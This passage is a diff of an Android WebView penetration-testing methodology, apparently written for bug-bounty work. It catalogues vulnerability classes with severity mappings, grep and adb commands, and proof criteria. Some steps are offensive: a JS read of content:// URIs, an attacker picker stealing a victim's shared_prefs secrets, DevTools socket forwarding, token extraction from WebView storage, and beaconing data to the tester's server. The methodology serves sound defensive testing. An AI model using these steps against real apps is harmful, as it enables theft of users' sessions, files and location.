   # confirm the EFFECTIVE value with the D10-001 Java.choose reader — do NOT infer from defaults
   ```
   Drop a payload the app will open, then:
@@ -984,13 +1041,14 @@ read or do?**
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
 | **Attacker** | AM-02 |
 | **Applies to** | `setAllowFileAccess` defaults **true for targetSdk ≤ 29**, false from 30 (LEGACY default-true below 30) |
+| **Requires** | webview |
 | **Maps to** | MASTG-KNOW-0018 defaults table; `risks/webview-unsafe-file-inclusion`; H1 #499348 |
 
 - **Test:** `setAllowFileAccess(true)` (or unset on targetSdk < 30) plus JS on plus a `file://` load path lets the page
   read the sandbox via XHR/symlink even without universal access — combine with D10-031 or D10-038.
 - **How:**
   ```bash
-  grep -rnE 'setAllowFileAccess|loadUrl\("file://|loadDataWithBaseURL' jadx_out/sources
+  grep -rnE 'setAllowFileAccess|loadUrl\("file://|loadDataWithBaseURL' $DEC/jadx/sources
   aapt2 dump badging app.apk | grep -E 'targetSdkVersion'
   ```
 - **Proof:** A `file://` page reading `/data/data/<pkg>/...`. `file:///android_asset` and `file:///android_res` are
@@ -1008,6 +1066,7 @@ read or do?**
 | **VRT** | `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) floor → P1 for a private token store |
 | **Attacker** | AM-02 |
 | **Applies to** | all — `setAllowContentAccess` defaults **true at every API level** |
+| **Requires** | webview |
 | **Maps to** | MASTG-TEST-0250/-0251, MASWE-0034; MASTG-KNOW-0018 ("declared by the app, even if not exported") |
 
 - **Test:** With content access on (the default), JS in the WebView can `XMLHttpRequest` any `content://` URI the app
@@ -1015,7 +1074,7 @@ read or do?**
   `file://` page can *read* those responses (without it the `XHR` sends but the body is unreadable).
 - **How:**
   ```bash
-  grep -rn 'setAllowContentAccess' jadx_out/sources     # absence = the insecure default applies
+  grep -rn 'setAllowContentAccess' $DEC/jadx/sources     # absence = the insecure default applies
   # from JS in the WebView (XHR, not fetch — fetch cannot read content://):
   #   var x=new XMLHttpRequest(); x.open('GET','content://<authority>/sensitive.txt'); ...
   ```
@@ -1034,6 +1093,7 @@ read or do?**
 | **VRT** | `server_side_injection.file_inclusion.local` (P1) → `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
 | **Attacker** | AM-02 |
 | **Applies to** | apps implementing custom `shouldInterceptRequest` resource loading |
+| **Requires** | webview |
 | **Maps to** | Oversecured "vulnerabilities in WebResourceResponse" (Amazon `LocalAssetHandler`); H1 #1011956 (CWE-749, $2300); local corpus Class #23 |
 
 - **Test:** A custom `shouldInterceptRequest` that serves a local file from a user-influenced path — `getLastPathSegment()`
@@ -1042,8 +1102,8 @@ read or do?**
   the attacker can match scheme/host/port.)
 - **How:**
   ```bash
-  grep -rn 'shouldInterceptRequest' jadx_out/sources -A25 | grep -nE 'getLastPathSegment|getPath|new File|FileInputStream|getAssets\(\).open'
-  grep -rn 'new WebResourceResponse(' jadx_out/sources -B8 | grep -i 'Access-Control-Allow-Origin'
+  grep -rn 'shouldInterceptRequest' $DEC/jadx/sources -A25 | grep -nE 'getLastPathSegment|getPath|new File|FileInputStream|getAssets\(\).open'
+  grep -rn 'new WebResourceResponse(' $DEC/jadx/sources -B8 | grep -i 'Access-Control-Allow-Origin'
   ```
   From any JS foothold:
   ```javascript
@@ -1066,6 +1126,7 @@ read or do?**
 | **VRT** | inherits the file-inclusion severity (D10-034/D10-031) |
 | **Attacker** | AM-02 |
 | **Applies to** | all apps serving local assets to a WebView |
+| **Requires** | webview |
 | **Maps to** | `risks/webview-unsafe-file-inclusion` (canonical `WebViewAssetLoader` snippet); `AssetsPathHandler`/`ResourcesPathHandler`/`InternalStoragePathHandler` |
 
 - **Test:** The recommended replacement serves assets over `https://appassets.androidplatform.net/assets/...` with the
@@ -1073,8 +1134,8 @@ read or do?**
   `InternalStoragePathHandler` scoped too broadly exposes internal storage over the asset-loader origin.
 - **How:**
   ```bash
-  grep -rn 'WebViewAssetLoader\|AssetsPathHandler\|ResourcesPathHandler\|InternalStoragePathHandler\|appassets.androidplatform.net' jadx_out/sources
-  grep -rn 'file:///android_asset\|file:///android_res' jadx_out/sources
+  grep -rn 'WebViewAssetLoader\|AssetsPathHandler\|ResourcesPathHandler\|InternalStoragePathHandler\|appassets.androidplatform.net' $DEC/jadx/sources
+  grep -rn 'file:///android_asset\|file:///android_res' $DEC/jadx/sources
   ```
 - **Proof:** `loadUrl("file:///android_asset/...")` plus any file-access setting enabled — then the D10-031 exfil PoC;
   or an over-scoped `InternalStoragePathHandler` root serving a private file.
@@ -1090,6 +1151,7 @@ read or do?**
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) via the bridge/file access the injected page reaches |
 | **Attacker** | AM-03 / AM-04 |
 | **Applies to** | all; the external-storage write precondition is easier below API 29 (pre-scoped-storage) |
+| **Requires** | webview |
 | **Maps to** | MobSF `android_webview_external` (CWE-919, masvs platform-6) |
 
 - **Test:** `webView.loadUrl("file://" + getExternalStorageDirectory() + ...)` renders content any app (pre-scoped
@@ -1097,7 +1159,7 @@ read or do?**
   and bridges.
 - **How:**
   ```bash
-  grep -rn 'loadUrl(' jadx_out/sources -B3 | grep -n 'getExternalStorageDirectory\|getExternalFilesDir\|/sdcard'
+  grep -rn 'loadUrl(' $DEC/jadx/sources -B3 | grep -n 'getExternalStorageDirectory\|getExternalFilesDir\|/sdcard'
   ```
 - **Proof:** Overwrite the target HTML from another app (or `adb push`) and show your script executing with bridge
   access.
@@ -1113,6 +1175,7 @@ read or do?**
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
 | **Attacker** | AM-03 (malicious app registering a high-priority picker) |
 | **Applies to** | all WebViews that enable file upload |
+| **Requires** | webview, device |
 | **Maps to** | Oversecured WebView checklist §12 ("theft of arbitrary files"); `WebChromeClient.java` ("WebView does not enforce restrictions on the chosen file") |
 
 - **Test:** `onShowFileChooser` fires an implicit `GET_CONTENT` via `createIntent()`; if `onActivityResult` passes
@@ -1120,8 +1183,8 @@ read or do?**
   outranks the system one returns a victim-internal `file://` URI, which the WebView then uploads.
 - **How:**
   ```bash
-  grep -rn 'onShowFileChooser' jadx_out/sources -A20
-  grep -rn 'onReceiveValue' jadx_out/sources -B10 | grep -n 'onActivityResult'
+  grep -rn 'onShowFileChooser' $DEC/jadx/sources -A20
+  grep -rn 'onReceiveValue' $DEC/jadx/sources -B10 | grep -n 'onActivityResult'
   ```
   Attacker picker (Oversecured shape): a priority-999 `GET_CONTENT`+`OPENABLE` activity doing
   `setResult(-1, new Intent().setData(Uri.parse("file:///data/user/0/com.victim/shared_prefs/secrets.xml")))`.
@@ -1140,6 +1203,7 @@ read or do?**
 | **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) |
 | **Attacker** | AM-03 |
 | **Applies to** | apps with `setAllowFileAccess(true)` (default < targetSdk 30) + a `file://` load path |
+| **Requires** | webview, device, legacy |
 | **Maps to** | H1 #532836 (Exness) — no root required |
 
 - **Test:** Combining a `file://` render path with a symlink turns "XSS in a WebView" into "exfiltrate the raw cookie
@@ -1164,13 +1228,14 @@ read or do?**
 | **VRT** | `insecure_data_transport.cleartext_transmission_of_sensitive_data` (VARIES, CWE-319) — the one TLS finding NOT downgraded to a pinning complaint |
 | **Attacker** | AM-06 (network attacker, no trusted CA) |
 | **Applies to** | all |
+| **Requires** | webview, mitm |
 | **Maps to** | MASTG-TEST-0284, MASWE-0027 (CWE-295/297); `WebViewClient.java` ("never proceed past errors"); MobSF `android_webview_ignore_ssl` |
 
 - **Test:** An `onReceivedSslError` implementation that calls `handler.proceed()` (or prompts and proceeds) disables
   certificate validation for all WebView traffic — regardless of the app's NSC or OkHttp pinning.
 - **How:**
   ```bash
-  grep -rn -A15 'onReceivedSslError' jadx_out/sources | grep -n 'proceed()'
+  grep -rn -A15 'onReceivedSslError' $DEC/jadx/sources | grep -n 'proceed()'
   ```
   Confirm with an untrusted CA that is **not** installed on the device (installing it would mask the bug). Runtime hook
   (`WebViewClient` is a *concrete* class, so this fires):
@@ -1194,13 +1259,14 @@ read or do?**
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) via injected script → token; the config alone is a P5 misconfiguration |
 | **Attacker** | AM-06 |
 | **Applies to** | permissive default is targetSdk ≤ 19; from targetSdk 21 default is NEVER_ALLOW (explicit call required) |
+| **Requires** | webview, mitm |
 | **Maps to** | MASTG-TEST-0284, `WebSettings.java` mixed-content constants; MobSF `android_webview_mixed_content` (CWE-319) |
 
 - **Test:** `MIXED_CONTENT_ALWAYS_ALLOW` (0) lets an HTTPS page pull HTTP subresources; a network attacker then
   injects script into the HTTPS origin without breaking TLS on the main document.
 - **How:**
   ```bash
-  grep -rn 'setMixedContentMode' jadx_out/sources     # confirm ALWAYS_ALLOW at runtime (0) via D10-001
+  grep -rn 'setMixedContentMode' $DEC/jadx/sources     # confirm ALWAYS_ALLOW at runtime (0) via D10-001
   ```
   MITM only the HTTP subresources and inject a `<script>`.
 - **Proof:** Injected script executing on the HTTPS origin (`document.domain` beacon to your server).
@@ -1217,6 +1283,7 @@ read or do?**
 | **VRT** | depends on the origin reached; not reproducible on a modern target without a precondition |
 | **Attacker** | AM-06 |
 | **Applies to** | LEGACY — cleartext blocked by default from targetSdk 28 |
+| **Requires** | webview, mitm, targetsdk<28, legacy |
 | **Maps to** | local corpus field-tooling additions; `usesCleartextTraffic`/NSC |
 
 - **Test:** Any 2014–2016-style PoC that MitM-injects JS into an `http://` page in a WebView needs a reachability
@@ -1225,7 +1292,7 @@ read or do?**
 - **How:**
   ```bash
   grep -n 'usesCleartextTraffic\|networkSecurityConfig' AndroidManifest.xml ; cat res/xml/network_security_config.xml 2>/dev/null
-  grep -rn "loadUrl(\"http://\|loadUrl('http://" jadx_out/sources
+  grep -rn "loadUrl(\"http://\|loadUrl('http://" $DEC/jadx/sources
   ```
 - **Proof:** The cleartext request in the proxy plus the NSC entry or the deep link that produced it; then the injected
   script executing.
@@ -1241,6 +1308,7 @@ read or do?**
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) — direct session-token delivery to the attacker origin |
 | **Attacker** | AM-02 |
 | **Applies to** | all (the cookie jar is shared, process-wide) |
+| **Requires** | webview |
 | **Maps to** | Oversecured WebView checklist "Cookie Injection"; local corpus Class #24 |
 
 - **Test:** `CookieManager.getInstance().setCookie(url, token)` with a non-constant `url` writes a sensitive cookie
@@ -1248,7 +1316,7 @@ read or do?**
   validating it delivers it to the attacker origin.
 - **How:**
   ```bash
-  grep -rn 'CookieManager.getInstance().setCookie(' jadx_out/sources    # non-constant URL argument
+  grep -rn 'CookieManager.getInstance().setCookie(' $DEC/jadx/sources    # non-constant URL argument
   ```
   Drive the WebView at an attacker origin first, then observe whether the app sets the auth cookie for it.
 - **Proof:** `document.cookie` on the attacker origin contains the app's session cookie, and it persists / is sent on
@@ -1264,6 +1332,7 @@ read or do?**
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
 | **Attacker** | AM-02 |
 | **Applies to** | all |
+| **Requires** | webview |
 | **Maps to** | H1 #3475626 (LinkedIn, High 8.1, CWE-Misconfiguration) |
 
 - **Test:** A WebView helper that stores the outgoing header map in a **static** field never clears it, so cookies
@@ -1275,8 +1344,8 @@ read or do?**
   this.webView.loadUrl(s, arrayMap0);
   ```
   ```bash
-  grep -rn 'static.*\(Map\|ArrayMap\|HashMap\).*HEADER' jadx_out/sources
-  grep -rn 'loadUrl(\w*,\s*\w*)' jadx_out/sources -B15 | grep -i cookie
+  grep -rn 'static.*\(Map\|ArrayMap\|HashMap\).*HEADER' $DEC/jadx/sources
+  grep -rn 'loadUrl(\w*,\s*\w*)' $DEC/jadx/sources -B15 | grep -i cookie
   ```
 - **Proof:** Load the first-party site in the fragment, then load your host in the same fragment, and show the
   `Cookie:` header with the app's session cookies in your access log. Reachability trick from #3475626: no deep link
@@ -1294,6 +1363,7 @@ read or do?**
 | **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when it enables session fixation / code interception on an OAuth endpoint |
 | **Attacker** | AM-02 |
 | **Applies to** | all; the setter exists from API 21 |
+| **Requires** | webview |
 | **Maps to** | `CookieManager.setAcceptThirdPartyCookies` (gap-adversary corpus) |
 
 - **Test:** `CookieManager.setAcceptThirdPartyCookies(webView, true)` re-enables cross-site cookies inside the app's
@@ -1301,7 +1371,7 @@ read or do?**
   defeating the isolation the system browser gives the same flow.
 - **How:**
   ```bash
-  grep -rnE 'setAcceptThirdPartyCookies|setAcceptCookie' jadx_out/sources
+  grep -rnE 'setAcceptThirdPartyCookies|setAcceptCookie' $DEC/jadx/sources
   ```
   Confirm the live value with a Frida hook on `CookieManager.setAcceptThirdPartyCookies`, then from an iframe you
   control set and read a cookie for the IdP origin.
@@ -1318,6 +1388,7 @@ read or do?**
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when a token moves into a query string or bridge |
 | **Attacker** | AM-02 |
 | **Applies to** | targetSdk 31+ |
+| **Requires** | webview, targetsdk>=31 |
 | **Maps to** | `about/versions/12/behavior-changes-12` (Modern SameSite cookies in WebView; devtools flag `webview-enable-modern-cookie-same-site`) |
 
 - **Test:** At targetSdk 31, WebView treats no-`SameSite` cookies as `Lax` and requires `Secure` for `SameSite=None`.
@@ -1325,7 +1396,7 @@ read or do?**
   "fixed" this by moving the token into a URL parameter or a `@JavascriptInterface` call.
 - **How:**
   ```bash
-  grep -rn 'SameSite' jadx_out/sources res/
+  grep -rn 'SameSite' $DEC/jadx/sources res/
   ```
   In Burp, inspect `Set-Cookie` on the in-WebView auth flow; A/B with the WebView DevTools flag
   `webview-enable-modern-cookie-same-site` (`adb shell am start -a com.android.webview.SHOW_DEV_UI`).
@@ -1343,6 +1414,7 @@ read or do?**
 | **VRT** | `broken_authentication_and_session_management.failure_to_invalidate_session.on_logout` (P4); higher if the extracted token is still server-valid |
 | **Attacker** | AM-03 / AM-10 / AM-11 (needs file access or a shared/lost device) |
 | **Applies to** | all |
+| **Requires** | webview, device |
 | **Maps to** | MASTG-TEST-0320, MASWE-0001 (CWE-312/922); MASTG-TECH-0142/-0143; HackTricks README ("Eternal cookies") |
 
 - **Test:** WebViews persist HTTP cache, DOM storage, IndexedDB, cookies and OPFS/SQLite-Wasm under
@@ -1371,13 +1443,14 @@ read or do?**
 | **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (P5) alone; High when a live token is recovered → D13 |
 | **Attacker** | AM-03 / AM-11 |
 | **Applies to** | `setSavePassword` is a no-op from API 18 (LEGACY); DOM-storage/cookie residue is current |
+| **Requires** | webview, device |
 | **Maps to** | `WebSettings.java` deprecations; MASTG-TEST-0320; hackwithsingh sec-14-7 #5/#6/#12/#13/#14 |
 
 - **Test:** Check `setSavePassword`, `setSaveFormData`, `setDatabaseEnabled`, `setDomStorageEnabled`, then look at what
   is actually written into the WebView data dirs (tokens in localStorage, WebSQL, form data).
 - **How:**
   ```bash
-  grep -rnE 'setSavePassword|setSaveFormData|setDatabaseEnabled|setDomStorageEnabled|setCacheMode|clearFormData' jadx_out/sources
+  grep -rnE 'setSavePassword|setSaveFormData|setDatabaseEnabled|setDomStorageEnabled|setCacheMode|clearFormData' $DEC/jadx/sources
   adb shell run-as com.target cat 'app_webview/Default/Local Storage/leveldb/'*.log | strings | grep -i token
   ```
 - **Proof:** A bearer/session token recovered from Local Storage / WebSQL on disk.
@@ -1393,13 +1466,14 @@ read or do?**
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
 | **Attacker** | AM-02 |
 | **Applies to** | all |
+| **Requires** | webview, device |
 | **Maps to** | Niraj Kharel methodology (grep `loadUrl()` without `loadUrlWithoutCookies()`) |
 
 - **Test:** Returning `false` from `shouldOverrideUrlLoading` (or not handling a scheme) lets the WebView navigate
   anywhere and keep the session cookies — cookies transmit by default unless the app uses a cookie-less load.
 - **How:**
   ```bash
-  grep -rn 'loadUrl(' jadx_out/sources | grep -v 'loadUrlWithoutCookies'
+  grep -rn 'loadUrl(' $DEC/jadx/sources | grep -v 'loadUrlWithoutCookies'
   ```
   Point the WebView at Burp Collaborator via a D09/D10 entry and read the headers it sends.
 - **Proof:** Collaborator logs an inbound request carrying the app's `Cookie:`/`Authorization:` header, then exercise
@@ -1416,6 +1490,7 @@ read or do?**
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) via the exposed session; the config alone maps to P5 debug-mechanism |
 | **Attacker** | AM-03 (any local process reaching the abstract socket) / AM-10/AM-11 (USB) |
 | **Applies to** | all (KitKat+); works independently of the `debuggable` flag |
+| **Requires** | webview, device |
 | **Maps to** | MASTG-TEST-0227, MASWE-0063 (CWE-489); `WebView.java`; Guardsquare (library globally enabling it) |
 
 - **Test:** `setWebContentsDebuggingEnabled(true)` shipped in release (or enabled process-wide by a library) exposes
@@ -1423,7 +1498,7 @@ read or do?**
   app is affected.
 - **How:**
   ```bash
-  grep -rn 'setWebContentsDebuggingEnabled' jadx_out/sources -B4 -A2   # check for a FLAG_DEBUGGABLE / BuildConfig.DEBUG guard
+  grep -rn 'setWebContentsDebuggingEnabled' $DEC/jadx/sources -B4 -A2   # check for a FLAG_DEBUGGABLE / BuildConfig.DEBUG guard
   adb shell cat /proc/net/unix | grep -i webview_devtools
   adb forward tcp:9222 localabstract:webview_devtools_remote_$(adb shell pidof -s com.target)
   curl -s http://127.0.0.1:9222/json | jq -r '.[].url'
@@ -1443,6 +1518,7 @@ read or do?**
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1)-adjacent; covert capture — rate on demonstrated impact |
 | **Attacker** | AM-02 |
 | **Applies to** | all; `react-native-webview` and `unity-webview` grant by default if the app holds the permission |
+| **Requires** | webview |
 | **Maps to** | `WebChromeClient.java` (`onPermissionRequest` default denies); SecWeb 2022 "The Bridge... is Still Broken" (5% of top-250 permission-requesting apps) |
 
 - **Test:** The default `onPermissionRequest` denies. An override calling `request.grant(request.getResources())`
@@ -1450,7 +1526,7 @@ read or do?**
   holds the permission.
 - **How:**
   ```bash
-  grep -rn -A12 'onPermissionRequest\|PermissionRequest\|WebChromeClient' jadx_out/sources | grep -n '\.grant('
+  grep -rn -A12 'onPermissionRequest\|PermissionRequest\|WebChromeClient' $DEC/jadx/sources | grep -n '\.grant('
   ```
   From a page loaded in the WebView: `navigator.mediaDevices.getUserMedia({audio:true,video:true}).then(s=>...)`.
 - **Proof:** `getUserMedia` resolves with live tracks and **no prompt** while the app already holds `CAMERA`/`RECORD_AUDIO`;
@@ -1467,13 +1543,14 @@ read or do?**
 | **VRT** | precise-location disclosure to an attacker origin — rate on impact |
 | **Attacker** | AM-02 |
 | **Applies to** | all; `setGeolocationEnabled` defaults true; prompt fires only for secure origins |
+| **Requires** | webview |
 | **Maps to** | `WebChromeClient.java`, `WebSettings.java`; hackwithsingh sec-14-7 #8 |
 
 - **Test:** An override of `onGeolocationPermissionsShowPrompt` that calls `callback.invoke(origin, true, true)`
   silently and persistently grants location to whatever origin is loaded.
 - **How:**
   ```bash
-  grep -rn -A10 'onGeolocationPermissionsShowPrompt\|setGeolocationEnabled' jadx_out/sources | grep -n 'invoke('
+  grep -rn -A10 'onGeolocationPermissionsShowPrompt\|setGeolocationEnabled' $DEC/jadx/sources | grep -n 'invoke('
   ```
 - **Proof:** `navigator.geolocation.getCurrentPosition` returning real coordinates to your origin; POST them out.
 - **Escalation:** → D20; one-click via D09.
@@ -1488,6 +1565,7 @@ read or do?**
 | **VRT** | `mobile_security_misconfiguration.*` (P5) alone; Medium as an aggravator with weak URL validation |
 | **Attacker** | AM-02 |
 | **Applies to** | WebView Safe Browsing on by default from Android 8.1 (API 27) |
+| **Requires** | webview |
 | **Maps to** | MASTG-TEST-0399, MASWE-0035 (CWE-829); `risks/cross-app-scripting` (meta-data snippet) |
 
 - **Test:** Disabled via manifest meta-data or in code (code takes precedence). Removes the platform's last backstop on
@@ -1495,7 +1573,7 @@ read or do?**
 - **How:**
   ```bash
   grep -n 'android.webkit.WebView.EnableSafeBrowsing' AndroidManifest.xml
-  grep -rn 'setSafeBrowsingEnabled(false)\|onSafeBrowsingHit' jadx_out/sources
+  grep -rn 'setSafeBrowsingEnabled(false)\|onSafeBrowsingHit' $DEC/jadx/sources
   ```
 - **Proof:** `<meta-data ... EnableSafeBrowsing android:value="false"/>` or `setSafeBrowsingEnabled(false)`; confirm
   `getSafeBrowsingEnabled()=false` at runtime and load a Safe-Browsing test URL with no interstitial.
@@ -1511,6 +1589,7 @@ read or do?**
 | **VRT** | `server_security_misconfiguration.path_traversal` (VARIES) for the write; `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) for the cookie leak |
 | **Attacker** | AM-02 |
 | **Applies to** | apps with an in-app browser or any WebView that can navigate to attacker content |
+| **Requires** | webview |
 | **Maps to** | no external identifier verified (corpus covers `shouldOverrideUrlLoading`/`shouldInterceptRequest`; `setDownloadListener` is otherwise absent) |
 
 - **Test:** A WebView cannot download by itself; the app supplies a `DownloadListener` whose callback receives `url`,
@@ -1518,7 +1597,7 @@ read or do?**
   of app-private files, and whether the app's cookies/`Authorization` attach to the attacker-chosen URL.
 - **How:**
   ```bash
-  grep -rnE 'setDownloadListener|onDownloadStart|guessFileName|URLUtil\.guessFileName|parseContentDisposition' jadx_out/sources
+  grep -rnE 'setDownloadListener|onDownloadStart|guessFileName|URLUtil\.guessFileName|parseContentDisposition' $DEC/jadx/sources
   ```
   Serve from your origin in the app's browser:
   ```
@@ -1538,6 +1617,7 @@ read or do?**
 | **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) |
 | **Attacker** | AM-02 |
 | **Applies to** | apps embedding `androidx.credentials` Credential Manager in WebView |
+| **Requires** | webview |
 | **Maps to** | `identity/sign-in/credential-manager` (WebView integration; "proper origin verification is required"; passkeys bound via assetlinks.json) |
 
 - **Test:** Credential Manager integrates with WebView and the docs are explicit that "when using WebView, proper
@@ -1545,7 +1625,7 @@ read or do?**
   the app's RP ID is a credential/passkey-phishing primitive.
 - **How:**
   ```bash
-  grep -rn 'CredentialManager\|GetCredentialRequest\|GetPublicKeyCredentialOption\|GetPasswordOption\|allowedProviders' jadx_out/sources
+  grep -rn 'CredentialManager\|GetCredentialRequest\|GetPublicKeyCredentialOption\|GetPasswordOption\|allowedProviders' $DEC/jadx/sources
   ```
   Navigate the WebView off-origin (deep link, open redirect, bridge) and attempt the credential flow; also check for a
   missing `allowedProviders` (lets any installed credential provider answer).
@@ -1563,6 +1643,7 @@ read or do?**
 | **VRT** | `server_side_injection.file_inclusion.local` (P1) → `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
 | **Attacker** | AM-02 (needs script execution in the WebView) |
 | **Applies to** | Capacitor Android (designed feature of the local server, not a CVE) |
+| **Requires** | webview, capacitor |
 | **Maps to** | Capacitor `Bridge.java` (`CAPACITOR_FILE_START="/_capacitor_file_"`, `window.WEBVIEW_SERVER_URL`); `AndroidProtocolHandler.openFile()` |
 
 - **Test:** Capacitor's local server maps any path starting `/_capacitor_file_` to `new FileInputStream(path)` — prefix
@@ -1593,6 +1674,7 @@ read or do?**
 | **VRT** | `server_side_injection.file_inclusion.local` (P1)-class read primitive; SSRF into internal hosts |
 | **Attacker** | AM-02 |
 | **Applies to** | Capacitor Android with the CapacitorHttp plugin (default in recent Capacitor) |
+| **Requires** | webview, capacitor |
 | **Maps to** | Capacitor `Bridge.java` (`CAPACITOR_HTTP_INTERCEPTOR_START`), `WebViewLocalServer.handleCapacitorHttpRequest()`, `plugin/CapacitorHttp.java` (`addJavascriptInterface(this,"CapacitorHttpAndroidInterface")`) |
 
 - **Test:** `/_capacitor_http_interceptor_?u=<absolute-url>` performs the request **natively**, copying the page's
@@ -1618,6 +1700,7 @@ read or do?**
 | **VRT** | `server_side_injection.remote_code_execution_rce` (P1) for a plugin reaching code/file access; else the token/file paths |
 | **Attacker** | AM-02 |
 | **Applies to** | Capacitor Android |
+| **Requires** | webview, capacitor |
 | **Maps to** | Capacitor `MessageHandler.java` (`addWebMessageListener(..., "androidBridge", allowedOriginRules, ...)`, falls back to `addJavascriptInterface(this,"androidBridge")` on exception or `android.useLegacyBridge`); `PluginManager.parsePluginsJSON()` |
 
 - **Test:** Every registered Capacitor plugin method is invokable from JS by posting a JSON message. Enumerate the
@@ -1647,6 +1730,7 @@ read or do?**
 | **VRT** | `server_side_injection.remote_code_execution_rce` (P1) if `exec()` succeeds; High if only the bridge object is exposed off-origin |
 | **Attacker** | AM-02 |
 | **Applies to** | Cordova / Ionic-on-Cordova Android |
+| **Requires** | webview, cordova |
 | **Maps to** | Cordova `SystemWebViewEngine.java` (`addJavascriptInterface(exposedJsApi,"_cordovaNative")`), `SystemExposedJsApi.java`, `CordovaBridge.java` (`verifySecret`, `promptOnJsPrompt`, `gap:`/`gap_init:`) |
 
 - **Test:** Cordova exposes `exec()` via `_cordovaNative`, guarded by an integer `bridgeSecret` handed out only to a
@@ -1677,6 +1761,7 @@ read or do?**
 | **VRT** | `server_side_injection.file_inclusion.local` (P1) → `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
 | **Attacker** | AM-02 |
 | **Applies to** | Cordova-Android (LEGACY compatibility mode; should never ship) |
+| **Requires** | webview, cordova |
 | **Maps to** | Cordova `SystemWebViewEngine.java` (`preferences.getBoolean("AndroidInsecureFileModeEnabled",false)` → `setAllowFileAccess(true)`+`setAllowUniversalAccessFromFileURLs(true)`) |
 
 - **Test:** This preference switches the WebView back to a `file://` origin **and** sets `setAllowFileAccess(true)` +
@@ -1702,6 +1787,7 @@ read or do?**
 | **VRT** | precondition for bridge access — rate on the bridge PoC (P1) |
 | **Attacker** | AM-02 |
 | **Applies to** | Cordova / Ionic-on-Cordova |
+| **Requires** | webview, cordova |
 | **Maps to** | Cordova `WhitelistPlugin.java` (`"*"` on allow-navigation expands to `http://*/*`,`https://*/*` **and `data:*`**); Cordova whitelist docs ("cannot block redirects from whitelisted remote sites") |
 
 - **Test:** `<allow-navigation href="*">` lets the WebView top-level navigate anywhere including `data:`;
@@ -1727,6 +1813,7 @@ read or do?**
 | **VRT** | `server_side_injection.remote_code_execution_rce` (P1) when `onMessage` routes into a privileged native module; else token/file paths |
 | **Attacker** | AM-02 |
 | **Applies to** | React Native apps using `react-native-webview` |
+| **Requires** | webview, react-native |
 | **Maps to** | `RNCWebView.java` (`JAVASCRIPT_INTERFACE="ReactNativeWebView"`, `injectedObjectJson`), `RNCWebViewManager.kt` (defaults `setSupportMultipleWindows(true)`, `allowUniversalAccessFromFileURLs=false`) |
 
 - **Test:** `react-native-webview` installs a `ReactNativeWebView` interface with `postMessage`, and exposes props that
@@ -1755,6 +1842,7 @@ read or do?**
 | **VRT** | plugin access from an attacker origin → P1-class device/file access |
 | **Attacker** | AM-02 / AM-06 |
 | **Applies to** | LEGACY — Cordova-Android < 4.1.1 (< 4.0.2 for config-via-Intent) |
+| **Requires** | webview, cordova, legacy |
 | **Maps to** | CVE-2015-5256, CVE-2015-1835, CVE-2014-3502, CVE-2014-3500; Google "How to fix apps with Apache Cordova vulnerabilities" |
 
 - **Test:** Fingerprint the Cordova-Android version. Below 4.1.1 the whitelist cannot stop a redirect from a
@@ -1780,6 +1868,7 @@ read or do?**
 | **VRT** | `cross_site_scripting_xss.*` on visited content; higher when it reaches a wallet/bridge action |
 | **Attacker** | AM-02 |
 | **Applies to** | any app shipping a browser or in-app WebView for third-party content |
+| **Requires** | webview |
 | **Maps to** | H1 #1941767 (MetaMask, Medium 4.7); Cordova/Capacitor CSP guidance |
 
 - **Test:** An app's embedded browser that ignores the CSP *header* (while honouring the `<meta>` tag) silently removes
@@ -1804,6 +1893,7 @@ read or do?**
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) if the bridge exposes token/file/financial actions |
 | **Attacker** | AM-09 (malicious backend/CDN, subdomain takeover, stale bucket) |
 | **Applies to** | all apps loading remote HTML/JS into a bridged WebView |
+| **Requires** | webview, js-bridge |
 | **Maps to** | `risks/insecure-webview-native-bridges`, `risks/unsafe-uri-loading` (gap-coverage corpus) |
 
 - **Test:** A WebView that loads remote HTML/JS from a CDN (help centre, promo, terms, campaign) **and** has
@@ -1811,8 +1901,8 @@ read or do?**
   or compromised CMS direct bridge access.
 - **How:**
   ```bash
-  grep -rnE 'loadUrl\(|loadDataWithBaseURL\(|WebViewAssetLoader' jadx_out/sources -A4 | grep -oE 'https?://[^"]+'
-  grep -rnE 'addJavascriptInterface|addWebMessageListener|@JavascriptInterface|postWebMessage' jadx_out/sources -B4
+  grep -rnE 'loadUrl\(|loadDataWithBaseURL\(|WebViewAssetLoader' $DEC/jadx/sources -A4 | grep -oE 'https?://[^"]+'
+  grep -rnE 'addJavascriptInterface|addWebMessageListener|@JavascriptInterface|postWebMessage' $DEC/jadx/sources -B4
   for H in $(hosts from above); do dig +short "$H"; curl -sI "https://$H/" | head -1; done   # still owned?
   ```
   Then MitM one asset (system-CA harness) and replace it with a page that calls every bridge method.
@@ -1830,6 +1920,7 @@ read or do?**
 | **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null, rated on what it reaches) → P1-class when it reaches a private component/file grant |
 | **Attacker** | AM-02 (web content already in the WebView) |
 | **Applies to** | any WebView not hard-blocking non-`http(s)` schemes in `shouldOverrideUrlLoading` |
+| **Requires** | webview |
